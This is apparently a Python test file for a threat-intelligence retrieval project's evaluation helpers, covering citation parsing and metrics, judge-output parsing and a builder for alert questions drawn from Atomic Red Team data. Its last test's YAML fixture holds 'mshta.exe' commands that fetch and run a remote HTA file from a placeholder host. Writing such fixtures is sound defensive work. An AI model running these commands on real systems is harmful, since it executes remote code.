"""Answer-eval helpers: citation parsing, citation metrics, judge parsing. No models, no network."""

import sys
from pathlib import Path

from threatlens.citations import extract_citations, mentioned_ids
from threatlens.index import embedding_prefixes

sys.path.insert(0, str(Path(__file__).parents[1] / "eval"))
from judge import parse_verdict  # noqa: E402
from metrics import citation_metrics, statements  # noqa: E402
from run_retrieval_eval import usable_questions  # noqa: E402


def test_extract_citations_single_grouped_and_noise():
    text = (
        "PowerShell is abused [attack:T1059.001]. Detect it [sigma:abc-1, attack:T1059.001; "
        "kev:CVE-2024-3400]. See [the docs](https://x) and [1]."
    )
    assert extract_citations(text) == ["attack:T1059.001", "sigma:abc-1", "kev:CVE-2024-3400"]


def test_mentioned_ids():
    assert mentioned_ids("CVE-2021-44228, T1059.001, t1003 and M1032; not T12") == {
        "CVE-2021-44228",
        "T1059.001",
        "T1003",
        "M1032",
    }


def test_statements_skip_headings_and_fragments():
    ans = "**Summary**\nPowerShell is widely abused by attackers [attack:T1059.001].\n- ok\n## Details"
    assert statements(ans) == ["PowerShell is widely abused by attackers [attack:T1059.001]."]


def test_citation_metrics():
    ans = (
        "**Summary**\n"
        "Log4Shell is exploited in the wild [kev:CVE-2021-44228].\n"
        "- It maps to T1190 and was used with T1059.009 [attack:T1190] [attack:T9999].\n"
        "- Patching is the main mitigation for this vulnerability."
    )
    provided = ["kev:CVE-2021-44228", "attack:T1190"]
    m = citation_metrics(ans, provided, {"kev:CVE-2021-44228"}, "Log4j CVE-2021-44228 T1190")
    assert m["citation_validity"] == 2 / 3  # attack:T9999 was never provided
    assert m["gold_cited"] == 1.0
    assert m["statement_coverage"] == 2 / 3
    assert m["unsupported_ids"] == 1.0  # T1059.009 is in no source
    # gold not retrieved -> generation can't be blamed, so gold_cited is undefined
    assert citation_metrics(ans, provided, {"sigma:x"}, "")["gold_cited"] is None
    assert citation_metrics("No sources cover this.", [], set(), "")["citation_validity"] is None


def test_parse_verdict():
    v = parse_verdict(
        'Sure: {"claims": [{"claim": "a", "supported": true}, {"claim": "b", "supported": false}],'
        ' "relevancy": 4}'
    )
    assert v["faithfulness"] == 0.5 and v["relevancy"] == 4.0
    assert parse_verdict("no json here") is None
    assert parse_verdict('{"claims": [], "relevancy": 9}') == {
        "claims": [],
        "faithfulness": None,
        "relevancy": None,
    }


def test_usable_questions_drops_stale_gold_ids():
    qs = [
        {"id": "a", "gold_ids": ["attack:T1", "attack:OLD"]},
        {"id": "b", "gold_ids": ["certfr:GONE"]},
    ]
    assert usable_questions(qs, {"attack:T1"}) == [{"id": "a", "gold_ids": ["attack:T1"]}]


def test_embedding_prefixes():
    assert embedding_prefixes("BAAI/bge-small-en-v1.5")[0].startswith("Represent this sentence")
    assert embedding_prefixes("intfloat/multilingual-e5-small") == ("query: ", "passage: ")
    assert embedding_prefixes("BAAI/bge-m3") == ("", "")
    assert embedding_prefixes("sentence-transformers/all-MiniLM-L6-v2") == ("", "")


def test_bootstrap_ci_and_paired_difference():
    from metrics import bootstrap_ci, paired_bootstrap

    scores = [1.0] * 80 + [0.0] * 20
    lo, hi = bootstrap_ci(scores)
    assert lo < 0.8 < hi and 0.70 < lo and hi < 0.90
    assert bootstrap_ci(scores) == (lo, hi)  # seeded, reproducible
    assert bootstrap_ci([1.0] * 10) == (1.0, 1.0)

    # two questions out of 100 differ: the interval must contain 0
    other = [1.0] * 78 + [0.0] * 22
    d, dlo, dhi = paired_bootstrap(scores, other)
    assert abs(d - 0.02) < 1e-9 and dlo <= 0.0 <= dhi


def test_alert_question_builder(tmp_path):
    import build_alert_questions as b

    d = tmp_path / "T1218.005"
    d.mkdir()
    (d / "T1218.005.yaml").write_text(
        """attack_technique: T1218.005
atomic_tests:
- name: leaks the label
  supported_platforms: [windows]
  executor: {name: command_prompt, command: 'mshta.exe C:\\\\AtomicRedTeam\\\\T1218.005\\\\x.hta'}
- name: has setup lines
  supported_platforms: [windows]
  executor: {name: powershell, command: "$a = 1\\nmshta.exe $a http://example.test/a.hta"}
- name: linux only
  supported_platforms: [linux]
  executor: {name: sh, command: 'echo this is long enough to pass the filter'}
- name: good
  auto_generated_guid: g-1
  supported_platforms: [windows]
  input_arguments: {url: {default: 'http://example.test/a.hta'}}
  executor: {name: command_prompt, command: 'mshta.exe #{url}'}
""",
        encoding="utf-8",
    )
    qs = b.build(tmp_path)
    assert len(qs) == 1 and qs[0]["gold_ids"] == ["attack:T1218.005"]
    assert "mshta.exe http://example.test/a.hta" in qs[0]["question"]
    assert qs[0]["type"] == "alert_atomic" and qs[0]["atomic_guid"] == "g-1"
    assert b.build(tmp_path, known={"attack:T1059"}) == []
